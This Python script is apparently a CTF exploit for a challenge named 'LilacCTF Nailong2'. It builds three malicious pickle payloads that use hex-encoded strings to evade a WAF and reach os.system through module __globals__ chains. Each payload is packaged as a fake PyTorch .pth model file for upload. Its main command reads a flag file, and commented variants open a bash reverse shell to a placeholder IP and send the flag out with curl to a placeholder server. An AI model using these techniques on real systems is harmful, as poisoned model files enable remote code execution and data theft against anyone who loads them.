#!/usr/bin/env python3
"""
LilacCTF Nailong2 - Alternative Payloads (V21)
Multiple side-channel approaches to bypass WAF

Approach 1: warnings.catch_warnings.__init__.__globals__['linecache'].__dict__['os']
Approach 2: functools.reduce + getattr chain
Approach 3: Direct __builtins__ manipulation
"""

import pickle
import pickletools
import struct
import io
import zipfile

# Opcodes
PROTO = b'\x80'
GLOBAL = b'c'
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
BINGET = b'h'
BINPUT = b'q'


def pack_str(s: str) -> bytes:
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def approach_warnings(command: str) -> bytes:
    """
    warnings module has reference to linecache, which has os
    warnings.catch_warnings.__init__.__globals__['linecache'].cache 
    -> leads to os through various paths
    """
    # Hex encoded strings
    hex_os = b'os'.hex()
    hex_system = b'system'.hex()  
    hex_globals = b'__globals__'.hex()
    hex_linecache = b'linecache'.hex()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Helper: decode hex string
    def add_hex_decode(hexstr, memo_id):
        # codecs.decode(hexstr, 'hex')
        p.write(GLOBAL + b'codecs\ndecode\n')
        p.write(MARK)
        p.write(pack_str(hexstr))
        p.write(pack_str('hex'))
        p.write(TUPLE)
        p.write(REDUCE)
        
        # .decode() to get string
        p.write(GLOBAL + b'builtins\ngetattr\n')
        p.write(MARK)
        p.write(BINPUT + bytes([memo_id]))
        p.write(BINGET + bytes([memo_id]))
        p.write(pack_str('decode'))
        p.write(TUPLE)
        p.write(REDUCE)
        p.write(EMPTY_TUPLE)
        p.write(REDUCE)
        return memo_id + 1
    
    memo = 0
    
    # Build 'os' string -> memo[1]
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_os))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # 'os'
    
    # Build 'system' -> memo[2]
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_system))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x03')  # 'system'
    
    # Build '__globals__' -> memo[4]
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_globals))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x04')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x04')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x05')  # '__globals__'
    
    # Get warnings.catch_warnings
    p.write(GLOBAL + b'warnings\ncatch_warnings\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(warnings.catch_warnings, '__init__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(pack_str('__init__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')
    
    # getattr(__init__, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(BINGET + b'\x05')  # '__globals__'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')  # globals dict
    
    # globals['os']
    p.write(GLOBAL + b'operator\ngetitem\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x01')  # 'os'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x09')  # os module
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x09')
    p.write(BINGET + b'\x03')  # 'system'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x0a')
    
    # Call system(command)
    p.write(BINGET + b'\x0a')
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_types_module(command: str) -> bytes:
    """
    Use types.FunctionType.__globals__ trick
    Or use typing module internals
    """
    hex_os = b'os'.hex()
    hex_system = b'system'.hex()
    hex_globals = b'__globals__'.hex()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Build strings with hex decode
    # 'os' -> memo[1]
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_os))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')
    
    # 'system' -> memo[3]
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_system))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x03')
    
    # '__globals__' -> memo[5]
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(hex_globals))
    p.write(pack_str('hex'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x04')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x04')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x05')
    
    # Use sys.breakpointhook (Python 3.7+) which has os in globals
    # Or use pprint.pprint which imports os
    p.write(GLOBAL + b'pprint\npprint\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(pprint.pprint, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(BINGET + b'\x05')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')
    
    # __globals__['os']
    p.write(GLOBAL + b'operator\ngetitem\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(BINGET + b'\x01')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x03')
    p.write(TUPLE)
    p.write(REDUCE)
    
    # system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_shutil(command: str) -> bytes:
    """
    shutil module imports os, use shutil.rmtree.__globals__['os']
    """
    hex_os = b'os'.hex()
    hex_system = b'system'.hex()
    hex_globals = b'__globals__'.hex()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Build hex-decoded strings (same pattern)
    for idx, hexstr in enumerate([hex_os, hex_system, hex_globals]):
        p.write(GLOBAL + b'codecs\ndecode\n')
        p.write(MARK)
        p.write(pack_str(hexstr))
        p.write(pack_str('hex'))
        p.write(TUPLE)
        p.write(REDUCE)
        p.write(BINPUT + bytes([idx * 2]))
        
        p.write(GLOBAL + b'builtins\ngetattr\n')
        p.write(MARK)
        p.write(BINGET + bytes([idx * 2]))
        p.write(pack_str('decode'))
        p.write(TUPLE)
        p.write(REDUCE)
        p.write(EMPTY_TUPLE)
        p.write(REDUCE)
        p.write(BINPUT + bytes([idx * 2 + 1]))
    
    # memo[1] = 'os', memo[3] = 'system', memo[5] = '__globals__'
    
    # shutil.rmtree
    p.write(GLOBAL + b'shutil\nrmtree\n')
    p.write(BINPUT + b'\x06')
    
    # getattr(shutil.rmtree, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x06')
    p.write(BINGET + b'\x05')  # '__globals__'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x07')
    
    # __globals__['os']
    p.write(GLOBAL + b'operator\ngetitem\n')
    p.write(MARK)
    p.write(BINGET + b'\x07')
    p.write(BINGET + b'\x01')  # 'os'
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x08')
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x08')
    p.write(BINGET + b'\x03')  # 'system'
    p.write(TUPLE)
    p.write(REDUCE)
    
    # system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    """Create valid PyTorch model file"""
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    print(f"[+] Saved: {output_path}")


def main():
    command = "cat /flag"
    # For reverse shell:
    # command = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/9999 0>&1'"
    # For curl exfil:
    # command = "curl http://YOUR_VPS:8000/$(cat /flag | base64 | tr -d '\n')"
    
    print("[*] Generating multiple payload variants...")
    
    approaches = [
        ("evil_logging.pth", approach_warnings, "warnings.catch_warnings.__init__.__globals__"),
        ("evil_pprint.pth", approach_types_module, "pprint.pprint.__globals__"),
        ("evil_shutil.pth", approach_shutil, "shutil.rmtree.__globals__"),
    ]
    
    for filename, func, desc in approaches:
        print(f"\n[*] Approach: {desc}")
        payload = func(command)
        print(f"    Payload size: {len(payload)} bytes")
        create_pytorch_zip(payload, filename)
        
        # Debug disassembly
        print("    Opcodes preview:")
        try:
            pickletools.dis(payload)
        except ValueError:
            print("    [Stack warning - OK]")
        print("-" * 60)
    
    print("\n[+] All payloads generated! Try uploading each one.")


if __name__ == "__main__":
    main()
